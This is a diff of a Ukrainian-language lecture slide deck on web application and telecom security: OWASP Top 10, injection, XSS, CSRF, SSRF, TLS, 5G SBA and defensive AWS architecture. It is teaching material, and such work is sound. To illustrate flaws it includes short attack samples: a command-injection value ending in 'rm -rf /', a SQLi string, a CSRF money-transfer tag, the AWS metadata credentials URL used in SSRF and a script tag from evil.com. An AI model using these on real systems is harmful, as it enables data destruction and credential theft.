+            <p>IDOR (Insecure Direct Object Reference) є найпоширенішим підвидом: ідентифікатор ресурсу передається клієнтом, а сервер не перевіряє власника. <code>GET /api/invoices/1041</code> замість <code>/invoices/1042</code> — якщо сервер повертає дані без перевірки, це IDOR. У телекомунікаційному контексті такий недолік може призвести до витоку CDR (деталізованих записів дзвінків) — персональних даних, що охороняються законом про таємницю зв'язку.</p>
+            <p>Ефективний захист базується на кількох принципах: перевірка прав на кожному backend-запиті (незалежно від перевірки на UI); принцип «deny by default» — усе, що явно не дозволено, забороняється; централізована логіка авторизації через middleware; автоматизовані тести авторизації в CI/CD. Використання UUID замість послідовних числових ID знижує ризик випадкового вгадування, але не замінює перевірки прав.</p>`,
+
+            /* Слайд 6 */
+            `<h3>A03: Ін'єкції — механізм атаки та теорія захисту</h3>
+            <p>Ін'єкційні атаки базуються на одному принципі: межа між кодом і даними порушена. Зловмисник вбудовує дані, які інтерпретатор (СУБД, командна оболонка, LDAP-сервер) виконує як команди. SQL Injection виникає при конкатенації SQL-рядків: <code>query = "SELECT * FROM users WHERE id=" + user_id</code>. Якщо передати <code>1 OR 1=1</code>, запит поверне всіх користувачів. Захист є елегантно простим — параметризовані запити, де значення передається окремо від тексту SQL.</p>
+            <p>Command Injection є особливо небезпечним: <code>os.system("ping " + host)</code> при <code>host = "8.8.8.8; rm -rf /"</code> виконає дві команди. Безпечна альтернатива — <code>subprocess.run(["ping", host], ...)</code>, де список аргументів не інтерпретується командною оболонкою. LDAP Injection виникає при побудові LDAP-фільтрів з введення користувача без екранування спеціальних символів.</p>
+            <p>Загальний принцип захисту: дані ніколи не повинні інтерпретуватися як команди. Інструменти захисту включають: параметризовані запити та підготовлені вирази (prepared statements); ORM-фреймворки (SQLAlchemy, Hibernate); суворо обмежений список допустимих символів (whitelist validation) для вхідних даних; мінімальні привілеї облікового запису БД (SELECT-only там, де не потрібен INSERT); AWS WAF із SQLi та XSS Managed Rules як додатковий рівень захисту.</p>`,
+
+            /* Слайд 7 */
+            `<h3>A02: Cryptographic Failures — теорія криптографічного захисту</h3>
+            <p>Криптографічні збої є другою за значущістю категорією вразливостей. Вони виникають не лише тоді, коли шифрування відсутнє, але й при використанні застарілих або неправильно налаштованих алгоритмів. Показовий приклад — злам бази LinkedIn у 2012 році: 6,5 мільйонів хешів MD5 без солі були зламані за кілька годин за допомогою райдужних таблиць. MD5 і SHA-1 генерують однаковий хеш для однакового пароля — без «солі» (random salt) зловмисник може використовувати precomputed таблиці.</p>
+            <p>Для хешування паролів необхідні спеціалізовані алгоритми: <strong>bcrypt</strong> (cost factor ≥ 12, 2^12 ітерацій), <strong>Argon2id</strong> (переможець Password Hashing Competition, рекомендований NIST). Вони спеціально спроектовані для повільності, що робить brute force практично неможливим. ECB mode для AES є небезпечним: однакові блоки відкритого тексту шифруються в однакові блоки шифротексту, що дозволяє виявляти патерни. Правильний вибір — AES-256-GCM або ChaCha20-Poly1305 (алгоритми автентифікованого шифрування AEAD).</p>
+            <p>В AWS управління ключами реалізується через AWS KMS (Key Management Service) з автоматичною ротацією та детальним аудитом використання. AWS Secrets Manager забезпечує безпечне зберігання та ротацію паролів БД, API-ключів, OAuth tokens. AWS Certificate Manager (ACM) надає безкоштовні TLS-сертифікати з автоматичним оновленням для ALB, CloudFront та API Gateway.</p>`,
+
+            /* Слайд 8 */
+            `<h3>A07: XSS — механізм атаки та сучасні методи захисту</h3>
+            <p>Cross-Site Scripting (XSS) дозволяє зловмиснику виконати JavaScript у браузері жертви. Розрізняють три типи: <strong>Reflected XSS</strong> — шкідливий скрипт у HTTP-запиті відображається у відповіді; <strong>Stored XSS</strong> — зловмисний код збережений у БД і виконується у кожного відвідувача; <strong>DOM-based XSS</strong> — маніпуляція DOM без взаємодії з сервером, через небезпечні методи <code>innerHTML</code>, <code>document.write</code>. Наслідки варіюються від крадіжки сесійного cookie до кейлогінгу та фішингу через iframe.</p>
+            <p>Критично важливо розуміти, що <strong>output encoding</strong> є першою та основною лінією захисту: HTML-символи <code>&lt; &gt; &amp; " '</code> у контексті HTML-виводу повинні замінюватися відповідними HTML-сутностями. Сучасні фреймворки (React, Vue, Angular) виконують автоматичне екранування. <strong>Content Security Policy (CSP)</strong> є потужним механізмом: директива <code>default-src 'self'; script-src 'self' 'nonce-{random}'</code> дозволяє виконання скриптів лише з дозволених джерел та з коректним nonce, блокуючи більшість XSS-атак навіть при вразливому коді.</p>
+            <p>Атрибут <strong>HttpOnly</strong> для сесійних cookie забороняє JavaScript-коду читати їх значення, нівелюючи найпоширеніший наслідок XSS. Атрибут <strong>SameSite=Strict</strong> додатково обмежує відправлення cookie у крос-сайтових запитах. DOMPurify є стандартною бібліотекою для sanitization HTML-вмісту, якщо виведення HTML неминуче (наприклад, WYSIWYG-редактор).</p>`,
+
+            /* Слайд 9 */
+            `<h3>CSRF — теорія атаки та механізми захисту</h3>
+            <p>Cross-Site Request Forgery (CSRF) базується на фундаментальній властивості браузера: автоматичне додавання cookie до кожного запиту на відповідний домен, незалежно від сайту-ініціатора. Зловмисник розміщує на своєму сайті прихований запит до захищеного сайту — <code>&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;</code> — і браузер автентифікованої жертви виконає цей запит разом із сесійним cookie.</p>
+            <p>Найефективніший захід — <strong>CSRF-токен</strong>: унікальне непередбачуване значення, що генерується сервером, вставляється у кожну HTML-форму та перевіряється при обробці запиту. Зловмисний сайт не може прочитати цей токен завдяки Same-Origin Policy браузера. <strong>SameSite=Strict</strong> cookie є сучасним і ефективним доповненням: при ньому браузер взагалі не надсилає cookie у крос-сайтових запитах. Для SPA та мобільних застосунків рекомендується використовувати JWT у заголовку <code>Authorization: Bearer</code> замість cookie — такий підхід природньо захищений від CSRF, оскільки браузер не додає заголовки автоматично.</p>
+            <p>Популярні фреймворки мають вбудований захист: Django вимагає <code>{% csrf_token %}</code> у кожній формі через <code>CsrfViewMiddleware</code>, Spring Security автоматично генерує та перевіряє CSRF-токен. Важливо зазначити, що CORS (Cross-Origin Resource Sharing) не є захистом від CSRF — він контролює лише доступ до відповідей, але не запобігає надсиланню запитів.</p>`,
+
+            /* Слайд 10 */
+            `<h3>SSRF — Server-Side Request Forgery у хмарному середовищі</h3>
+            <p>Server-Side Request Forgery (SSRF) є атакою, за якої зловмисник змушує сервер виконувати HTTP-запити до довільних ресурсів. Особливу небезпеку SSRF становить у хмарних середовищах, де через цю вразливість можна отримати IAM-credentials через AWS IMDS v1 (Instance Metadata Service): <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role</code>. Цей вектор реалізувався у реальному зламуванні Capital One у 2019 році: зловмисник отримав тимчасові IAM credentials, що дали доступ до S3-сховищ із даними 106 мільйонів клієнтів.</p>
+            <p>Вразливість виникає, коли застосунок приймає URL як параметр і виконує запит без валідації: <code>GET /fetch?url=https://example.com</code>. Зловмисник може підставити внутрішні адреси (<code>http://10.0.0.1/admin</code>), адресу IMDS, або адреси внутрішніх сервісів. Через Blind SSRF можна сканувати внутрішню мережу навіть без отримання відповіді, аналізуючи затримки та коди помилок.</p>
+            <p>Захист включає: whitelist дозволених доменів для URL-параметрів; блокування приватних IP-діапазонів (10.x.x.x, 172.16-31.x.x, 192.168.x.x, 169.254.x.x) на рівні мережевих правил; обов'язкове використання <strong>IMDSv2</strong> на всіх EC2-інстансах (вимагає попереднього PUT-запиту для отримання сесійного токена — неможливо виконати через стандартний SSRF); AWS WAF з правилами для виявлення SSRF-патернів.</p>`,
+
+            /* Слайд 11 */
+            `<h3>Аутентифікація, управління сесіями та MFA — теоретичні основи</h3>
+            <p>Надійна аутентифікація є фундаментом безпеки будь-якого веб-застосунку. Категорія A07 OWASP охоплює широкий спектр: відсутність захисту від brute force, слабкі або передбачувані сесійні токени, відсутність MFA, некоректна інвалідація сесії. Атака <strong>Credential Stuffing</strong> — автоматизоване тестування списків витоків паролів з інших сервісів — є масовою та ефективною, оскільки більшість користувачів повторно використовують паролі.</p>
+            <p>Зберігання паролів вимагає спеціалізованих алгоритмів: <strong>bcrypt</strong> з cost factor ≥ 12 або <strong>Argon2id</strong> (рекомендований NIST SP 800-63B). Сесійний ідентифікатор повинен бути 128-бітним криптографічно стійким випадковим значенням, переданим виключно через cookie з атрибутами <code>HttpOnly; Secure; SameSite=Strict</code>. Ці три атрибути разом захищають від XSS (HttpOnly), перехоплення (Secure), та CSRF (SameSite). Після logout сесія повинна інвалідуватися на сервері — лише очищення cookie на клієнті є недостатнім.</p>
+            <p>Багатофакторна автентифікація (MFA) суттєво знижує ризик компрометації: TOTP (FIDO2/WebAuthn) є найбільш стійким до фішингу завдяки прив'язці до конкретного домену. SMS OTP є прийнятним, але вразливим до SS7-атак та SIM swap — NIST SP 800-63B рекомендує уникати його як єдиного MFA-фактора для критичних систем. Hardware security keys (YubiKey) є найвищим рівнем захисту для адміністративних акаунтів.</p>`,
+
+            /* Слайд 12 */
+            `<h3>OWASP API Security Top 10 — вразливості програмних інтерфейсів</h3>
+            <p>API-безпека виокремлена в окремий напрямок через специфічний характер ризиків. <strong>BOLA (Broken Object Level Authorization, API1)</strong> є API-аналогом IDOR і є найпоширенішою API-вразливістю: endpoint дозволяє маніпулювати ідентифікаторами об'єктів без перевірки права доступу. <strong>Broken Authentication (API2)</strong> охоплює токени без терміну дії та слабкі ключі. <strong>BOPA (API3)</strong> — повернення або зміна через PATCH полів, до яких поточний користувач не має доступу.</p>
+            <p><strong>Unrestricted Resource Consumption (API4)</strong> описує відсутність ліміту: кількість запитів, розмір відповіді, глибина рекурсії в GraphQL. Без rate limiting будь-який endpoint є вектором DoS. <strong>Improper Inventory Management (API9)</strong> наголошує на ризиках застарілих версій: якщо <code>/v1/</code> без захисту продовжує функціонувати поряд із захищеним <code>/v3/</code>, зловмисник використовуватиме стару версію. <strong>Unsafe API Consumption (API10)</strong> — некритичне ставлення до відповідей сторонніх API, що також може бути скомпрометованих.</p>
+            <p>У телекомунікаційному контексті ці ризики набувають критичного характеру: зловживання NEF чи CAMARA API може призвести до несанкціонованого відстеження місцезнаходження абонентів, обходу SIM-своп-захисту або витоку роумінгових даних. Ключові принципи захисту: автентифікація та авторизація на кожному endpoint (не лише на рівні маршрутизатора); rate limiting; версіонування з офіційним виводом з експлуатації; валідація схеми за OpenAPI/JSON Schema; мінімальна відповідь.</p>`,
+
+            /* Слайд 13 */
+            `<h3>HTTPS та TLS — теорія транспортної безпеки</h3>
+            <p>HTTPS є стандартом де-факто для всіх сучасних веб-застосунків. В основі лежить протокол TLS (Transport Layer Security), що забезпечує три фундаментальні властивості: конфіденційність (шифрування даних), цілісність (захист від модифікації), аутентифікацію (перевірка особи сервера через сертифікат). TLS 1.3 принципово відрізняється від TLS 1.2: зменшена кількість допустимих алгоритмів (лише AEAD cipher suites), виключені небезпечні режими, рукостискання виконується за 1-RTT замість 2-RTT.</p>
+            <p>Процес TLS Handshake в TLS 1.3: клієнт надсилає <code>ClientHello</code> із підтримуваними версіями та key_share; сервер відповідає <code>ServerHello</code> з сертифікатом і завершує рукостискання (1-RTT); спільний секрет генерується через ECDHE. Клієнт верифікує ланцюжок сертифікатів до довіреного кореневого CA. Після цього весь трафік шифрується з perfect forward secrecy — навіть якщо довготривалий ключ сервера буде скомпрометований в майбутньому, попередні сесії залишаться зашифрованими.</p>
+            <p>Серед типових проблем конфігурації TLS: підтримка TLS 1.0/1.1 (вразливі до BEAST, POODLE); слабкі cipher suites (RC4, 3DES); відсутність HSTS — дозволяє SSL stripping; mixed content (завантаження HTTP-ресурсів у HTTPS-сторінці); протерміновані або самопідписані сертифікати. AWS Certificate Manager вирішує проблему управління сертифікатами: безкоштовні публічні сертифікати з автоматичним оновленням за 60 днів до закінчення терміну.</p>`,
+
+            /* Слайд 14 */
+            `<h3>WAF та OWASP ASVS — практичний чеклист безпеки</h3>
+            <p>Web Application Firewall (WAF) аналізує HTTP/HTTPS трафік на рівні застосунку (L7) і блокує шкідливі запити до того, як вони досягнуть коду. WAF захищає від стандартних атак OWASP Top 10, бот-трафіку, brute force через rate limiting та дозволяє реалізувати geo-blocking. Однак WAF не замінює безпечний код: бізнес-логічні вразливості (IDOR, Broken Access Control) WAF виявити не може. False positive — блокування легітимних запитів — є практичною проблемою при впровадженні.</p>
+            <p>OWASP ASVS (Application Security Verification Standard) Level 2 містить 286 перевіряємих вимог безпеки, організованих за доменами: Аутентифікація, Управління сесіями, Контроль доступу, Валідація вхідних даних, Криптографія, Обробка помилок та логування, Захист даних, Комунікаційна безпека, Конфігурація HTTP. Кожна вимога формулюється як тестоване твердження, що дозволяє автоматизувати перевірку.</p>
+            <p>Практичний чеклист для будь-якого веб-застосунку включає: перевірку bcrypt/Argon2id для паролів; наявність захисту від brute force; атрибути <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> для сесійних cookie; наявність шести обов'язкових HTTP Security Headers; правильну конфігурацію AWS WAF Managed Rules. Цей перелік є мінімальним базовим рівнем безпеки.</p>`,
+
+            /* Слайд 15 */
+            `<h3>HTTP Security Headers та Content Security Policy</h3>
+            <p>HTTP Security Headers є одним із найпростіших і найефективніших механізмів захисту — вони реалізуються зміною конфігурації сервера без будь-яких змін у коді застосунку. <strong>Strict-Transport-Security (HSTS)</strong> з директивою <code>max-age=31536000; includeSubDomains; preload</code> змушує браузер завжди використовувати HTTPS для даного домену протягом одного року, навіть якщо користувач вводить <code>http://</code>. Це захищає від SSL stripping атак.</p>
+            <p><strong>Content Security Policy (CSP)</strong> є потужним механізмом: директива <code>default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'</code> дозволяє виконання скриптів лише з власного домену та скриптів із коректним одноразовим nonce-атрибутом. Навіть якщо зловмиснику вдасться впровадити тег <code>&lt;script src="evil.com/attack.js"&gt;</code>, браузер заблокує його виконання через відсутній nonce. <strong>X-Frame-Options: DENY</strong> захищає від Clickjacking — завантаження сайту в прихований iframe для обману користувача.</p>
+            <p><strong>Permissions-Policy</strong> (раніше Feature-Policy) обмежує доступ JavaScript до API браузера: <code>camera=(), microphone=(), geolocation=()</code> забороняє доступ до камери, мікрофону та геолокації для сторінки та всіх іфреймів. <strong>Referrer-Policy: strict-origin-when-cross-origin</strong> запобігає витоку повної URL через заголовок Referer при переходах на зовнішні сайти. Автоматизована перевірка через securityheaders.com або Mozilla Observatory надає числову оцінку конфігурації.</p>`,
+
+            /* Слайд 16 */
+            `<h3>OAuth 2.0, JWT та OpenID Connect — стандарти делегованої авторизації</h3>
+            <p>OAuth 2.0, JWT та OIDC формують сучасний стек стандартів аутентифікації та авторизації. <strong>OAuth 2.0</strong> визначає протоколи безпечного делегування доступу: ресурс-власник дозволяє клієнту обмежений доступ до своїх ресурсів на сервері ресурсів, не передаючи свої облікові дані. <strong>Authorization Code + PKCE</strong> є рекомендованим flow для SPA та мобільних застосунків: PKCE захищає від перехоплення authorization code через генерацію <code>code_verifier</code> та його SHA-256 хешу <code>code_challenge</code>.</p>
+            <p><strong>JWT (JSON Web Token)</strong> є самодостатнім токеном: Header.Payload.Signature, де кожна частина є base64url-кодованою. Payload містить claims: <code>sub</code> (ідентифікатор), <code>iss</code> (видавець), <code>exp</code> (термін дії), <code>aud</code> (аудиторія). Типові вразливості: атака <code>alg:none</code> — встановлення значення <code>none</code> для алгоритму підпису дозволяє підробити токен; атака RS256→HS256 — підміна алгоритму дозволяє підписати токен публічним ключем як HS256-секретом; відсутність перевірки <code>exp</code> — безстроковий токен.</p>
+            <p><strong>OpenID Connect (OIDC)</strong> є надбудовою над OAuth 2.0, що додає аутентифікацію: <code>id_token</code> підтверджує особу користувача через цифровий підпис від Identity Provider. OIDC відповідає на питання «хто ти?», OAuth 2.0 — «що тобі дозволено?». AWS Cognito реалізує повний стек: User Pools (аутентифікація) + Identity Pools (AWS credentials) + OAuth 2.0 + OIDC + MFA + соціальний вхід (Google, Apple, Facebook).</p>`,
+
+            /* Слайд 17 */
+            `<h3>Secure SDLC та концепція Shift-Left Security</h3>
+            <p>Secure SDLC (Software Development Life Cycle) інтегрує заходи безпеки в кожну фазу розробки. Концепція <strong>Shift-Left</strong> передбачає якомога раніше залучення практик безпеки: вартість виправлення вразливості на стадії вимог — умовно $1, на стадії проектування — $5, під час розробки — $15, у фазі QA — $30, у продуктивному середовищі — $150+. Ця прогресія пояснює, чому security-перевірки у CI/CD пайплайні є економічно обґрунтованими.</p>
+            <p><strong>Threat Modeling</strong> (методологія STRIDE) є ключовою практикою безпечного проектування: систематичне виявлення потенційних загроз на архітектурному рівні до початку реалізації. Кожен компонент системи аналізується на предмет Spoofing (підробка ідентичності), Tampering (модифікація даних), Repudiation (відмова від дій), Information Disclosure (витік інформації), Denial of Service, Elevation of Privilege. OWASP ASVS Level 2 надає 286 верифікованих вимог безпеки — структурований чеклист для систематичного охоплення всіх аспектів.</p>
+            <p>DevSecOps = DevOps + Security gates в CI/CD pipeline. Ключові практики: SAST у pre-commit hook (Semgrep, CodeQL) для швидкого зворотного зв'язку; SCA (Snyk, Dependabot) для автоматичного оновлення вразливих залежностей; DAST у staging-середовищі (OWASP ZAP); Image scanning (Trivy) для контейнерних образів; Infrastructure as Code scanning (Checkov, tfsec) для виявлення небезпечних конфігурацій Terraform. Зрілий рівень — автоматична зупинка pipeline при критичних знахідках.</p>`,
+
+            /* Слайд 18 */
+            `<h3>Інструменти тестування безпеки — статичний та динамічний аналіз</h3>
+            <p><strong>SAST (Static Application Security Testing)</strong> аналізує вихідний код без виконання. <strong>Semgrep</strong> є відкритим інструментом для написання власних правил у вигляді патернів коду: наприклад, правило для виявлення конкатенації SQL-рядків. Підтримує 20+ мов програмування, інтегрується в pre-commit hook та CI/CD. <strong>CodeQL</strong> (GitHub Advanced Security) будує семантичну модель потоків даних і може виявляти складні вразливості на кшталт taint tracking — відстеження потоку від user input до SQL query через декілька функцій.</p>
+            <p><strong>DAST (Dynamic Application Security Testing)</strong> тестує запущений застосунок, імітуючи реальні атаки. <strong>OWASP ZAP</strong> є відкритим стандартом з підтримкою automated scanning та ручного тестування через proxy. Ключова можливість — Baseline Scan у CI/CD, що автоматично перевіряє розгорнутий staging на типові вразливості (XSS, SQLi, CSRF, Insecure Headers). <strong>Burp Suite Pro</strong> є золотим стандартом ручного пентестингу: розширені можливості intercepting proxy, Intruder для фаззингу, Repeater для ручного тестування запитів.</p>
+            <p>AWS надає власні security scanning інструменти: <strong>Amazon Inspector V2</strong> безперервно сканує EC2-інстанси та контейнерні образи в ECR на CVE; <strong>AWS CodeGuru Security</strong> виконує SAST у CodePipeline; <strong>Macie</strong> виявляє чутливі дані (PII, PCI DSS) у S3. Комбінація цих інструментів з відкритими (Semgrep, Snyk, OWASP ZAP) формує повний pipeline безперервного тестування безпеки.</p>`,
+
+            /* Слайд 19 */
+            `<h3>Моніторинг безпеки та виявлення атак у реальному часі</h3>
+            <p>Ефективний моніторинг безпеки є необхідною умовою своєчасного виявлення та реагування на інциденти. За даними IBM Cost of a Data Breach Report, без належного логування та моніторингу зловмисник залишається в системі в середньому <strong>277 днів</strong> до виявлення. OWASP A09 наголошує: відсутність logging є вразливістю, рівнозначною будь-якій технічній помилці в коді.</p>
+            <p>Обов'язковому логуванню підлягають: всі спроби аутентифікації (успішні та невдалі) з IP-адресами та User-Agent; зміни привілеїв та конфігурації; HTTP-помилки 4xx/5xx в аномальній кількості; звернення до чутливих endpoint; спрацьовування WAF та заблоковані запити. Критично важливо, щоб логи не містили чутливих даних (паролі, токени, номери карток) та зберігалися в централізованому незмінному сховищі. В AWS повний стек моніторингу: WAF Logs → Kinesis Data Firehose → S3 → Athena (SQL-запити для аналізу) + CloudWatch Insights + GuardDuty (ML-детекція) + Security Hub (агрегація findings).</p>
+            <p>Ключові індикатори атаки (IOC) у веб-застосунках: аномально висока кількість 403/401 відповідей (brute force, unauthorized scanning); spike у WAF block rate; незвичні User-Agent або відсутність стандартних браузерних заголовків (бот-активність); запити з відомих C2 IP-адрес (GuardDuty ThreatIntel); аномальне географічне розподілення трафіку; аномальний обсяг вихідного трафіку (можливий data exfiltration).</p>`,
+
+            /* Слайд 20 */
+            `<h3>DDoS-атаки — класифікація, механізми та стратегії захисту</h3>
+            <p>DDoS (Distributed Denial of Service) атаки класифікуються за рівнем моделі OSI. <strong>Об'ємні атаки L3/L4</strong> (UDP flood, ICMP flood, DNS/NTP amplification) спрямовані на вичерпання пропускної здатності каналу. Amplification атаки є особливо ефективними: DNS amplification надає коефіцієнт підсилення до 100x (малий запит → велика відповідь). <strong>Протокольні атаки L4</strong> (SYN flood) вичерпують стан з'єднань: кожен SYN займає ресурс у таблиці з'єднань сервера до отримання ACK або таймаута.</p>
+            <p><strong>Прикладні атаки L7</strong> є найскладнішими для виявлення: HTTP flood використовує легітимні запити у великій кількості; Slowloris підтримує максимальну кількість з'єднань, надсилаючи заголовки з мінімальною швидкістю — веб-сервер зберігає з'єднання відкритими, очікуючи завершення запиту. У телекомунікаційному контексті специфічні DDoS-вектори: SIP INVITE-флуд на SBC (виснаження SIP Proxy), SS7/Diameter messaging flood на сигнальні шлюзи.</p>
+            <p>Ешелонована оборона від DDoS в AWS будується за принципом Defense in Depth: Route 53 (Anycast, GeoDNS, query flooding protection) → CloudFront (450+ PoP поглинають трафік на edge) → Shield Advanced (L3/L4/L7 детекція та мітигація) → AWS WAF (rate limiting, IP reputation) → ALB (connection timeout, slow start) → application (CAPTCHA, queue-based processing). Кожен рівень додає автономну здатність до виявлення та поглинання атаки.</p>`,
+
+            /* Слайд 21 */
+            `<h3>Кращі практики захисту веб-застосунків — системний підхід</h3>
+            <p>Ефективний захист веб-застосунку вимагає системного підходу, що охоплює рівень коду, інфраструктури та процесів. На <strong>рівні застосунку</strong>: серверна валідація всіх вхідних даних за принципом whitelist (дозволено лише очікуване); параметризовані запити для всіх взаємодій із БД; output encoding залежно від контексту (HTML, JavaScript, URL, CSS); мінімальні привілеї облікового запису БД (SELECT там, де не потрібен INSERT); безпечне управління секретами (AWS Secrets Manager, HashiCorp Vault); регулярне сканування залежностей (Snyk, Dependabot).</p>
+            <p>На <strong>рівні аутентифікації</strong>: MFA для привілейованих дій та адміністративних акаунтів; bcrypt/Argon2id для паролів із мінімальною довжиною 12 символів; перевірка паролів за базою відомих витоків через Have I Been Pwned API; account lockout або progressive delay після N невдалих спроб; генерація нового session ID при підвищенні привілеїв. На <strong>рівні інфраструктури</strong>: HTTPS скрізь із HSTS preloading; WAF перед кожним публічним endpoint; мережева сегментація (приватні підмережі для БД та backend); patch management із чіткими SLA (критичні CVE — ≤ 24 год).</p>
+            <p>OWASP ASVS Level 2 є стандартним орієнтиром для більшості веб-застосунків. Для телекомунікаційних систем рекомендується ASVS Level 3 (критичні системи) плюс галузеві стандарти GSMA CLP.13. Регулярне penetration testing (щоквартально для production систем) є обов'язковою практикою — жоден автоматизований інструмент не замінить досвідченого пентестера в пошуку бізнес-логічних вразливостей.</p>`,
+
+            /* Слайд 22 */
+            `<h3>Еталонна архітектура захищеного веб-застосунку в AWS</h3>
+            <p>Принцип <strong>Defence in Depth</strong> (ешелонована оборона) передбачає багаторівневий захист, де компрометація одного рівня не призводить до повного зламу системи. Еталонна архітектура AWS реалізує це через вертикальну стеку: Route 53 (GeoDNS + Shield Advanced) → CloudFront (TLS 1.3, WAF, OAC) → AWS WAF (Managed Rules + Custom Rules) → ALB (ACM сертифікат) → Amazon Cognito (MFA + JWT) → ECS/EKS (non-root container, read-only filesystem) → RDS (шифрування at rest + in transit, Private Subnet) → Secrets Manager (ротація credentials) → GuardDuty + Security Hub + CloudTrail.</p>
+            <p>Кожен рівень є автономним захистом та незалежним джерелом телеметрії. CloudFront поглинає DDoS та кешує статичний контент, знижуючи навантаження на origin. WAF фільтрує OWASP Top 10. Cognito управляє ідентичністю та надає JWT без необхідності самостійно реалізовувати аутентифікацію. ECS із non-root контейнерами реалізує принцип least privilege на рівні процесів. RDS у Private Subnet недоступний із публічного інтернету навіть у разі компрометації застосунку.</p>
+            <p>Ключові архітектурні принципи, що пронизують всі рівні: <strong>Zero Trust</strong> — перевіряй завжди, не довіряй нікому, навіть всередині периметру; <strong>Least Privilege</strong> — мінімальні права для кожного компонента; <strong>Fail Secure</strong> — при помилці відмовляти в доступі; <strong>Immutable Infrastructure</strong> — контейнери замінюються, а не оновлюються; <strong>Auditability</strong> — кожна дія логується та атрибутується конкретній ідентичності.</p>`,
+
+            /* Слайд 23 */
+            `<h3>Телеком веб-застосунки — унікальна поверхня атаки</h3>
+            <p>Телекомунікаційна галузь накладає особливі вимоги на безпеку веб-застосунків, що суттєво відрізняють її від типового корпоративного середовища. По-перше, вимоги до <strong>доступності</strong> є надзвичайно жорсткими: стандарт «п'ять дев'яток» (99,999%) допускає не більше 5 хвилин простою на рік. Будь-яке оновлення, що потребує перезапуску сервісу, повинно виконуватись у режимі rolling deployment без втрати доступності. По-друге, телеком-системи працюють у режимі реального часу: VoIP та сигналізація вимагають затримки менше 150 мс — глибока інспекція пакетів може додавати неприйнятну затримку.</p>
+            <p>Унікальна <strong>поверхня атаки</strong> включає: портали самообслуговування (billing, usage), де IDOR може призвести до витоку CDR; OAM/OSS/BSS веб-інтерфейси управління мережею, де RCE може зупинити мережеві функції; NFV/SDN веб-панелі (OpenStack Horizon, ONAP); між-операторські API для роумінгу та interconnect; 5G SBA з HTTP/2-інтерфейсами між NF. Кожен із цих компонентів має унікальну модель загроз, яку необхідно аналізувати окремо.</p>
+            <p>Унікальні ризики телекому включають: <strong>toll fraud</strong> через зловживання веб-API для ініціації платних дзвінків (прямий фінансовий збиток оператора); витік CDR через IDOR (порушення таємниці зв'язку, що охороняється законом); підробка абонентської ідентичності (fraud, правові наслідки); DoS-атаки на OAM-портали (зупинка мережевих функцій, масовий збій сервісу). Стандарт GSMA CLP.13 надає конкретні вимоги до безпеки хмарних розгортань для телеком-операторів.</p>`,
+
+            /* Слайд 24 */
+            `<h3>VoIP/SIP — протоколи, архітектура та вектори атак</h3>
+            <p>SIP (Session Initiation Protocol), визначений у RFC 3261, є текстовим HTTP-подібним протоколом для встановлення, зміни та завершення мультимедійних сесій. Архітектурно SIP-мережа складається з: User Agent Client/Server (кінцеве обладнання), SIP Proxy (маршрутизація запитів), Registrar (реєстрація URI↔IP), B2BUA (Back-to-Back UA, зокрема Session Border Controller). SIP відповідає лише за сигналізацію — медіапотоки передаються через окремий протокол RTP (Real-time Transport Protocol).</p>
+            <p>Кожен метод SIP є потенційним вектором атаки. <strong>SIP Flooding</strong> через тисячі одночасних INVITE/REGISTER виснажує ресурси Proxy. <strong>Registration Hijacking</strong> через перехоплення REGISTER перенаправляє всі вхідні дзвінки жертви до зловмисника. <strong>Toll Fraud</strong> використовує скомпрометований SIP-акаунт для ініціювання міжнародних платних дзвінків. <strong>Eavesdropping</strong> — перехоплення RTP-медіа без шифрування пасивним аналізом мережевого трафіку. <strong>BYE Injection</strong> — передчасне завершення активного дзвінка від імені одного зі учасників.</p>
+            <p>Комплексний захист SIP-інфраструктури: <strong>SIP-over-TLS (SIPS)</strong> для шифрування сигналізаційного каналу; <strong>SRTP</strong> для шифрування медіапотоків (аутентифікований шифр AES-128 або AES-256); <strong>SBC (Session Border Controller)</strong> як захисний бар'єр між публічними та приватними SIP-мережами — реалізує топологічне приховування, rate limiting, медіа-транскодування; <strong>Digest Authentication</strong> із nonce-значенням для кожного запиту; fail2ban для автоматичного блокування IP-адрес з аномальною активністю.</p>`,
+
+            /* Слайд 25 */
+            `<h3>5G SBA — Service-Based Architecture та безпека NF-інтерфейсів</h3>
+            <p>Архітектура 5G Service-Based Architecture (SBA) є фундаментальним зламом парадигми телекомунікаційних мереж. Замість спеціалізованих протоколів (SS7, Diameter, GTP) для взаємодії між ядерними вузлами, всі мережеві функції (NF) у 5G комунікують через HTTP/2 + JSON — Service-Based Interface (SBI). AMF, SMF, UDM, PCF, NRF, NEF, AUSF — всі реалізовані як мікросервіси з REST API, визначеними 3GPP TS 29.x серії. Це робить 5G-ядро мережі розподіленим веб-застосунком зі всіма супутніми ризиками.</p>
+            <p>Нові вектори атаки, специфічні для 5G SBI: незахищені NF-to-NF інтерфейси без mTLS дозволяють lateral movement після компрометації одного компонента; надмірно широкі OAuth 2.0 токени для NF-to-NF порушують принцип least privilege; HTTP/2-специфічні атаки (CONTINUATION frame flood, HPACK bomb) можуть спричинити DoS на NF. SSRF-атаки через HTTP-клієнти NF можуть скомпрометувати внутрішні мережеві ресурси, включаючи бази даних абонентів (UDM).</p>
+            <p>Стандарт <strong>3GPP TS 33.501</strong> визначає обов'язкові вимоги безпеки 5G: TLS 1.2+ для всіх SBI-інтерфейсів; OAuth 2.0 Client Credentials для NF-to-NF автентифікації (NRF виступає Authorization Server); mTLS для зовнішніх з'єднань через N32 між операторами; PRINS (Protection at SEPP) — end-to-end шифрування між операторами через SEPP (Security Edge Protection Proxy). Практична реалізація mTLS у Kubernetes-кластері (де часто розгортається 5G ядро) здійснюється через service mesh (Istio, Linkerd).</p>`,
+
+            /* Слайд 26 */
+            `<h3>Telecom API — NEF, CAMARA та GSMA Open Gateway Security</h3>
+            <p>NEF (Network Exposure Function) є стратегічним компонентом 5G-архітектури: шлюз між зовнішніми розробниками та внутрішньою мережею. NEF абстрагує складність телекомунікаційної інфраструктури, надаючи стандартизовані API для доступу до мережевих можливостей. Ключова функція безпеки NEF — захист внутрішньої мережі від прямого доступу третіх сторін, авторизація API-запитів та rate limiting.</p>
